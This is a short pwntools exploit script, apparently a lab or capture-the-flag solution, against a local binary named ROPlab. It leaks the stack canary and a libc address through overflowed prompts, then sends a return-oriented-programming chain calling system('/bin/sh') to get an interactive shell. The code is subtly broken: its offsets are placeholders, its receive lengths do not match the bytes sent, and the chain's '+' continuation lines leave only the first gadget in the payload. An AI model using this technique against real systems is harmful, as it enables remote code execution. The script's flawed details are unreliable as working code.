from pwn import *

# Addr
'''
readelf -a /lib64/libc-2.32.so | grep 'system'
'''
libc_start_offset = 0x1
system_offset = 0x4
bin_sh_offset = 0x2

# ROPgadget
L_pop_rdi = 0x1
L_nop = 0x1

# Exploit
r = process('./ROPlab')

r.sendafter('name :', 'a'*0x19)
r.recvuntil('a'*19)
canary = b'\x00' + r.recv(7)
print(hex(u64(canary)))

r.sendafter('here :', 'a'*0x28)
r.recvuntil('a'*28)
libc_start_addr = u64(r.recv(6) + b'\x00\x00') - 242
libc_base = libc_start_addr - libc_start_offset
print(hex(libc_base))

padding = b'a' * 0x18
fakerbp = p64(0)
ROPchain = p64(libc_base + L_pop_rdi)
+ p64(libc_base + bin_sh_offset)
+ p64(libc_base+system_offset)

payload = padding + canary + fakerbp + ROPchain

r.sendafter('remarks? ', payload)

r.interactive()

